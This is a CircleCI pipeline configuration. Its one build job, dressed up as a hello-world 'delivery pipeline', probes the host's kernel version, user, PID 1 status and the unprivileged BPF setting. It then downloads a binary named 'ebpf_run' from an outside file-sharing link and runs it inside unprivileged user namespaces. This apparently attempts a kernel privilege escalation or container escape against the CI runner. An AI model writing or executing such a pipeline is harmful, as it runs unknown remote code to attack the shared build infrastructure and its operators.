version: 2.1
jobs:
  build:
    docker:
      - image: ubuntu:20.04
    steps:
      - run:
          name: The First Step
          command: |
            echo 'Hello World!'
            echo 'This is the delivery pipeline'
            cat /proc/version
            uname -r
            whoami
            cat /etc/issue
            cat /proc/1/status
            cat /proc/sys/kernel/unprivileged_bpf_disabled
            apt update && apt install -y curl
            curl https://cloud.tsinghua.edu.cn/f/dd0140e60d714af59e17/?dl=1  --output ebpf_run
            ls -la
            ls -la
            ls -la
            chmod +x ebpf_run
            ls -la
            unshare -Urn "./ebpf_run"
            unshare -urn "./ebpf_run"